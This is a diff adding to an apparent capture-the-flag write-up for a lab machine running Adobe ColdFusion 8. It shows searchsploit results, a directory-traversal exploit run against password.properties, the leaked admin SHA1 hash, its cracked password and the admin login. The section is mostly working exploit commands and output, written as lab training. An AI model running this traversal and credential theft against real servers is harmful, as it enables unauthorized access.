@@ -133,7 +133,7 @@ Enumerating to `http://10.10.10.11:8500/CFIDE/administrator/`, we see a that it 
 
 We got a few ways to continue this, either looking for a password to login, search for vulnerabities with searchsploit etc, dirbuster this, or something.
 
-## 4. Enumerating Port 8500, FMTP
+## 4. Further Enumeration of Port 8500, FMTP
 Inspecting the source page of the `CFIDE/administrator/` login page, we see something interesting.
 ```
 <form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
@@ -226,3 +226,111 @@ _logintowizard.cfm                                          7135   03/18/08 11:0
 utils.cfc                                                   1596   03/18/08 11:07 πμ
 ```
 Ah, we cannot find a file that we can use to our advantage.
+
+## 5. Finding & Attacking with Adobe ColdFusion 8 Exploits
+As usual, we will do a Searchsploit on Adobe ColdFusion 8.
+```
+hippoeug@kali:~$ searchsploit coldfusion
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                 | cfm/webapps/36067.txt
+Adobe ColdFusion - Directory Traversal                                                                                              | multiple/remote/14641.py
+Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                 | multiple/remote/16985.rb
+Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                         | windows/remote/43993.py
+Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                       | multiple/webapps/45979.txt
+Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                   | cfm/webapps/29567.txt
+Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                  | cfm/webapps/36172.txt
+Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                           | windows/webapps/27755.txt
+Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                              | multiple/remote/30210.rb
+Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                     | multiple/webapps/40346.py
+Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                           | multiple/remote/24946.rb
+Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                        | cfm/webapps/33170.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                     | cfm/webapps/33167.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                              | cfm/webapps/33169.txt
+Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                               | cfm/webapps/33168.txt
+Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                 | multiple/remote/19093.txt
+Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                       | windows/local/19220.c
+Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                                              | multiple/remote/19712.txt
+ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                   | cfm/webapps/16788.rb
+ColdFusion 9-10 - Credential Disclosure                                                                                             | multiple/webapps/25305.py
+...
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+Already, we see some interesting results, lots of options to try.
+
+To aid our job, we also do a Google search in hopes of finding the most common vulnerability, one we could try first.
+We see [exploit](https://www.exploit-db.com/exploits/14641) `Adobe ColdFusion - Directory Traversal 14641.py`. Apparently, this exploit "exploits a directory traversal bug in Adobe ColdFusion, by reading the password.properties a user can login using the encrypted password itself. This should work on version 8 and below.".
+
+Additionally, another [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute`. We might need to try this later on if a payload if required to be uploaded.
+
+Let's try the `Directory Traversal` exploit, `14641.py`.
+```
+hippoeug@kali:~$ searchsploit -m 14641.py
+  Exploit: Adobe ColdFusion - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/14641
+     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+hippoeug@kali:~$ python 14641.py
+usage: 14641.py <host> <port> <file_path>
+example: 14641.py localhost 80 ../../../../../../../lib/password.properties
+if successful, the file will be printed
+
+hippoeug@kali:~$ python 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
+------------------------------
+trying /CFIDE/wizards/common/_logintowizard.cfm
+title from server in /CFIDE/wizards/common/_logintowizard.cfm:
+------------------------------
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+------------------------------
+------------------------------
+trying /CFIDE/administrator/archives/index.cfm
+title from server in /CFIDE/administrator/archives/index.cfm:
+------------------------------
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+------------------------------
+------------------------------
+trying /cfide/install.cfm
+title from server in /cfide/install.cfm:
+------------------------------
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+------------------------------
+------------------------------
+trying /CFIDE/administrator/entman/index.cfm
+title from server in /CFIDE/administrator/entman/index.cfm:
+------------------------------
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+------------------------------
+------------------------------
+trying /CFIDE/administrator/enter.cfm
+title from server in /CFIDE/administrator/enter.cfm:
+------------------------------
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+------------------------------
+```
+Ooh! Very interesting, we see a password `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`, which looks like a Hash. Since we know from earlier password is a SHA1 hash, we can use Crackstation to get the password.
+```
+2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03	sha1	happyday
+```
+With this password `happyday`, let's go back to `http://10.10.10.11:8500/CFIDE/administrator/` and try to login.
+
+We get directed to `10.10.10.11:8500/CFIDE/administrator/index.cfm` and successfully got in!
+
+## 6. Getting Flags?
